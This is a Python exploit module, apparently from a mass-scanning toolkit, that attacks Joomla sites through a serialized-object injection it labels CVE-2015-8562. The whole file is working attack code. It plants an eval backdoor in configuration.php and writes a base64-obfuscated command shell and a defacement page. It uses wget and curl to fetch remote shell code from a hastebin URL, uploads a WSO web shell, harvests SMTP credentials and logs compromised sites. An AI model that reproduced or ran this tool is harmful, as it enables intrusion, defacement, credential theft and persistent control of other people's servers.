# coding=utf-8
# Exploit Author: Alessandro Groppo, Developed By me.
import requests
import printModule
import getSMTP
import wsoShellUploaderModule
from bs4 import BeautifulSoup
backdoor_param = "neko@123"
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}


def get_token(url, cook):
    try:
        csrf = ''
        resp = requests.get('http://' + url, cookies=cook, headers=Headers)
        html = BeautifulSoup(str(resp.content), 'html.parser')
        for v in html.find_all('input'):
            csrf = v
        try:
            csrf = csrf.get('name')
        except:
            return csrf
        return csrf
    except:
        pass

def get_cook(url):
    try:
        resp = requests.get('http://' + url, headers=Headers)
        if len(resp.cookies) != 0:
            return resp.cookies
    except:
        pass

def make_req(url, object_payload):
    try:
        cook = get_cook(url)
        csrf = get_token(url, cook)
        user_payload = '\\0\\0\\0' * 9
        padding = 'AAA'
        inj_object = '";'
        inj_object += object_payload
        inj_object += 's:6:"return";s:102:'
        password_payload = padding + inj_object
        params = {
            'username': user_payload,
            'password': password_payload,
            'option': 'com_users',
            'task': 'user.login',
            csrf: '1'
        }
        resp = requests.post('http://' + url, headers=Headers, cookies=cook, data=params)
        return str(resp.content)
    except:
        pass


def get_backdoor_pay():
    try:
        function = 'assert'
        template = 's:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'
        payload =  'file_put_contents(\'configuration.php\',\'if(isset($_POST[\\\'' + backdoor_param +'\\\'])) eval($_POST[\\\''+backdoor_param+'\\\']);\', FILE_APPEND) || $a=\'http://wtf\';'
        final = template.replace('PAYLOAD',payload).replace('LENGTH', str(len(payload))).replace('FUNC_NAME', function).replace('FUNC_LEN', str(len(function)))
        return final
    except:
        pass

def execute_backdoor(url, payload_code):
    try:
        requests.post('http://' + url + '/configuration.php', data={backdoor_param: payload_code})
    except:
        pass

def ping_backdoor(url, param_name):
    try:
        res = requests.post('http://' + url + '/configuration.php', data={param_name: 'echo \'PWNED\';'}, headers=Headers)
        if 'PWNED' in str(res.content):
            return True
        return False
    except:
        return False

def exploit(url):
    try:
        target_url = url + '/index.php/component/users'
        make_req(target_url, get_backdoor_pay())
        if ping_backdoor(url, backdoor_param):
            execute_backdoor(url, 'system(\'echo "neko!!" > neko.htm\');')   # cmd=commend
            execute_backdoor(url, 'system(\'echo "Shell Access!<?php {}(base64_decode("{}")); ?>" > neko.php\');'.format('eval', 'c3lzdGVtKCRfR0VUWyJjbWQiXSk7'))
            execute_backdoor(url, 'system(\'echo "<?php fwrite(fopen("images/sh3.php","w+"),file_get_contents("https://hastebin.com/raw/oqikagison")); ?>" > c.php\');')
            execute_backdoor(url, 'system(\'wget https://hastebin.com/raw/oqikagison -O images/sh.php\');')
            execute_backdoor(url, 'system(\'curl -O https://hastebin.com/raw/oqikagison;mv oqikagison images/sh2.php\');')
            CheckShell = requests.get('http://' + url + '/neko.php', headers=Headers, timeout=10)
            checkIndex = requests.get('http://' + url + '/neko.htm', headers=Headers, timeout=10)
            requests.get('http://' + url + '/cc.php', headers=Headers, timeout=10)
            CheckShell2 = requests.get('http://' + url + '/images/up3.php', headers=Headers, timeout=10)
            CheckShell3 = requests.get('http://' + url + '/images/up2.php', headers=Headers, timeout=10)
            CheckShell4 = requests.get('http://' + url + '/images/up.php', headers=Headers, timeout=10)
            if 'Shell Access!' in str(CheckShell.content):
                WSo = wsoShellUploaderModule.UploadWso(url + '/neko.php?cmd=id')
                getSMTP.JooomlaSMTPshell(url + '/neko.php?cmd=id')
                with open('result/Shell_results.txt', 'a') as writer:
                    writer.write(url + '/neko.php?cmd=id' + '\n')
                if WSo == 'No':
                    pass
                else:
                    with open('result/WSo_Shell.txt', 'a') as Wr:
                        Wr.write('{}\n'.format(WSo))
            elif 'Shell Access!' in str(CheckShell2.content):
                WSo = wsoShellUploaderModule.UploadWso(url + '/images/up3.php?cmd=id')
                getSMTP.JooomlaSMTPshell(url + '/images/up3.php?cmd=id')
                with open('result/Shell_results.txt', 'a') as writer:
                    writer.write(url + '/images/up3.php?cmd=id' + '\n')
                if WSo == 'No':
                    pass
                else:
                    with open('result/WSo_Shell.txt', 'a') as Wr:
                        Wr.write('{}\n'.format(WSo))
            elif 'Shell Access!' in str(CheckShell3.content):
                WSo = wsoShellUploaderModule.UploadWso(url + '/images/up2.php?cmd=id')
                getSMTP.JooomlaSMTPshell(url + '/images/up2.php?cmd=id')
                with open('result/Shell_results.txt', 'a') as writer:
                    writer.write(url + '/images/up2.php?cmd=id' + '\n')
                if WSo == 'No':
                    pass
                else:
                    with open('result/WSo_Shell.txt', 'a') as Wr:
                        Wr.write('{}\n'.format(WSo))
            elif 'Shell Access!' in str(CheckShell4.content):
                WSo = wsoShellUploaderModule.UploadWso(url + '/images/up.php?cmd=id')
                getSMTP.JooomlaSMTPshell(url + '/images/up.php?cmd=id')
                with open('result/Shell_results.txt', 'a') as writer:
                    writer.write(url + '/images/up.php?cmd=id' + '\n')
                if WSo == 'No':
                    pass
                else:
                    with open('result/WSo_Shell.txt', 'a') as Wr:
                        Wr.write('{}\n'.format(WSo))
            if 'neko!!' in str(checkIndex.content):
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(url + '/neko.htm\n')
            return printModule.returnYes(url, 'CVE-2015-8562', 'Joomla 3.x Rce', 'Joomla')
        else:
            return printModule.returnNo(url, 'CVE-2015-8562', 'Joomla 3.x Rce', 'Joomla')
    except:
        return printModule.returnNo(url, 'CVE-2015-8562', 'Joomla 3.x Rce', 'Joomla')